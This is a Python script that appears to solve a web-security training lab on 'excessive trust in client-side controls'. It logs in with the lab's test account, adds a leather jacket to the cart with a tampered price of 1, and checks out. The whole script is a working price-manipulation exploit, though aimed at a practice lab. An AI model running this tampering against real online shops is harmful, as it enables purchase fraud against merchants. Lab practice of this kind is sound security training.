import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' :'http://127.0.0.1:8080'}

def get_csrf(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = soup.find("input", {'name' : 'csrf'})['value']
    return csrf_token


def get_productid(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    ahref = soup.find("img", src="/image/productcatalog/specialproducts/LeetLeatherJacket.jpg").parent()[3]
    product_id = re.search(r"productId=(\d+)", str(ahref)).group(1)
    return product_id


def cheat_cart(s, url):
    print("[+] First of all, we need to log-in as a valid user... we will use the user 'wiener'")
    login_url = url + "/login"
    params = {
        'csrf' : get_csrf(s, login_url),
        'username' : 'wiener',
        'password' : 'peter'
    }
    r = s.post(login_url, data=params, verify=False, proxies=proxies)
    if "Log out" and "wiener" in r.text:
        product_id = get_productid(s, url)
        print("[+] We are logged in!\n[+] Now we need to look for the correct product id which refers to the leather jacket which is... %s" % product_id)
        
        # ADD PRODUCT TO CART
        cart_url = url + "/cart"
        params = {
            'productId' : product_id,
            'redir' : 'PRODUCT',
            'quantity' : 1,
            'price' : 1
        }
        r = s.post(cart_url, data=params, verify=False, proxies=proxies)
        if r.status_code == 200:
            print("[+] Placing the order...")

            # PLACING THE ORDER
            order_url = url + "/cart/checkout"
            csrf_token = get_csrf(s, cart_url)
            params = {
                'csrf' : csrf_token
            }
            r = s.post(order_url, data=params, verify=False, proxies=proxies)
            if "Your order is on its way!" and r.status_code == 200:
                print("[+] Exploit succeeded!")


    else:
        print("[-] Oh no! Something went wrong!")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()

    url = sys.argv[1].strip()
    print("[+] ### Lab: Excessive trust in client-side controls")
    print("""[+] This lab doesn't adequately validate user input.
    You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price.
    To solve the lab, buy a "Lightweight l33t leather jacket"\n.""")

    cheat_cart(s, url)




if __name__ == "__main__":
    main()
